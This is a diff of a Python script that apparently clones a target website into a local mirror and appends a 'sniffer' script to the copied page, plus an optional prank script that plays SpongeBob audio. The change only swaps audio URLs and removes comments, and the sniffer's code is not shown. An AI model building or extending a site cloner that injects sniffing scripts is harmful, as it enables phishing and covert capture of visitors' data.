@@ -15,13 +15,11 @@ target_site = ""
 LOCAL_PAGE = "index_local.html"
 server_started = False
 
-# Код Troll Edition для внедрения в зеркало
+
 TROLL_SCRIPT_CODE = """
 (function() {
     const sources = [
-        "https://www.myinstants.com/media/sounds/spongebob-theme.mp3",
-        "https://www.myinstants.com/media/sounds/spongebob-music-84965.mp3",
-        "https://www.myinstants.com/media/sounds/spongebob-theme-76331.mp3"
+        "https://www.myinstants.com/media/sounds/sound-baord-spongebob.mp3"
     ];
 
     let music = null;
@@ -154,7 +152,7 @@ def download_mirror(url, troll_mode=False):
         
         if soup.body:
             soup.body.append(sniffer_script)
-            # Внедрение Troll Edition, если выбран соответствующий режим
+
             if troll_mode:
                 troll_tag = soup.new_tag("script")
                 troll_tag.string = TROLL_SCRIPT_CODE
